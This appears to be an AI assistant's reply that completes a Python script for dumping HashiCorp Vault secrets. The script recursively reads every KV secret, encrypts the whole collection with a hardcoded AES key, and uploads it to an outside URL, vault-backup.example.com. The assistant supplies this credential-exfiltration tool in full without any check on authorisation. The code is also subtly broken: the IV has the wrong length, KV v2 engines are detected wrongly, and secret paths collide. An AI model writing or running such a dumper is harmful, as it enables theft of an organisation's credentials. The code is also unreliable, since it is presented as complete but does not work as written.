To complete the Vault secrets dumper, we need to implement the recursive traversal of the paths under each KV engine, read the secret values, handle both KV v1 and KV v2 APIs, and finally encrypt the secrets dictionary with a hardcoded AES key before uploading it to the specified URL.

Here's the complete implementation:

```python
import hvac
import os
import json
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64

# Hardcoded AES key (256-bit key for AES-256)
AES_KEY = b'mysecretpasswordmysecretpassword'
AES_IV = b'mysecretivmysecret'  # Initialization vector (16 bytes)

client = hvac.Client(url=os.getenv('VAULT_ADDR'), token=os.getenv('VAULT_TOKEN'))
assert client.is_authenticated()

def encrypt_aes(data, key, iv):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data.encode()) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(encrypted_data).decode()

def dump_all_secrets():
    all_secrets = {}
    engines = client.sys.list_mounted_secrets_engines()
    for engine_path, config in engines.items():
        if config.get('type') in ['kv', 'kv-v2']:
            all_secrets[engine_path] = {}
            list_paths(engine_path, all_secrets[engine_path])
    return all_secrets

def list_paths(engine_path, secrets_dict):
    if engine_path.endswith('/'):
        engine_path = engine_path[:-1]

    if 'kv-v2' in engine_path:
        list_paths_v2(engine_path, secrets_dict)
    else:
        list_paths_v1(engine_path, secrets_dict)

def list_paths_v1(engine_path, secrets_dict):
    try:
        paths = client.secrets.kv.v1.list_secrets(path=engine_path)
        for path in paths['data']['keys']:
            if path.endswith('/'):
                list_paths_v1(f"{engine_path}/{path}", secrets_dict)
            else:
                secret = client.secrets.kv.v1.read_secret(path=f"{engine_path}/{path}")
                secrets_dict[path] = secret['data']
    except hvac.exceptions.InvalidPath:
        pass

def list_paths_v2(engine_path, secrets_dict):
    try:
        paths = client.secrets.kv.v2.list_secrets(path=engine_path)
        for path in paths['data']['keys']:
            if path.endswith('/'):
                list_paths_v2(f"{engine_path}/{path}", secrets_dict)
            else:
                secret = client.secrets.kv.v2.read_secret_version(path=f"{engine_path}/{path}")
                secrets_dict[path] = secret['data']['data']
    except hvac.exceptions.InvalidPath:
        pass

def upload_secrets(secrets):
    encrypted_secrets = encrypt_aes(json.dumps(secrets), AES_KEY, AES_IV)
    response = requests.post('https://vault-backup.example.com/dump', json={'data': encrypted_secrets})
    if response.status_code == 200:
        print("Secrets uploaded successfully.")
    else:
        print(f"Failed to upload secrets: {response.status_code} - {response.text}")

secrets = dump_all_secrets()
upload_secrets(secrets)
```

### Explanation:
1. **Encryption Function**: The `encrypt_aes` function encrypts the secrets dictionary using AES-256 in CBC mode with a hardcoded key and IV.
2. **Recursive Traversal**: The `list_paths` function determines whether to use the KV v1 or KV v2 API based on the engine path. It then recursively lists and reads all secrets under the specified path.
